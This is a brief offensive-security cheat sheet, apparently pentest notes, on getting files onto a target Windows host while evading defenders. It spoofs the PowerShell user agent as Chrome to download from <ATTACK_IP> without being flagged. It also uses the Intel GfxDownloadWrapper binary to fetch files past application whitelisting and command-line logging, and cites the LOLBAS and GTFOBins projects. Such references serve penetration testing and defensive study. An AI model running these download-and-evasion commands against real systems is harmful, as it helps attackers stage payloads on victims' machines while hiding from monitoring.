## PowerShell User Agent Spoofing

Use when default PowerShell **User Agents** are blacklisted or being flagged by defenders. Emulating internal browser traffic like Chrome or IE makes the download request appear legitimate.

List all available browser properties and their corresponding **User Agent** strings:

```
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]:: $($ _.Name)}} | fl
```

Assign the Chrome agent to a variable and execute the transfer:

```
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<ATTACK_IP>/<FILE_NAME> -UserAgent $UserAgent -OutFile "<FILE_PATH>"
```

**Blacklisted User Agents** will cause the request to fail or trigger alerts if the emulated browser is not common to the internal environment.

---

## LOLBin Execution (GfxDownloadWrapper)

Use when **Application whitelisting** prevents the use of PowerShell or Netcat. This method bypasses **Command-line logging** alerts by using a trusted Intel Graphics Driver binary typically excluded from monitoring.

Download a file using the Intel GfxDownloadWrapper utility:

```
GfxDownloadWrapper.exe "http://<ATTACK_IP>/<FILE_NAME>" "<FILE_PATH>"
```

- **LOLBAS Project** -> Windows binaries -> Prefer when searching for environment-specific "misplaced trust binaries".
- **GTFOBins Project** -> Linux binaries -> Prefer for file transfers using nearly 40 commonly installed Linux binaries.

**Missing Binary** prevents execution; this specific LOLBin requires the Intel Graphics Driver to be installed on the target.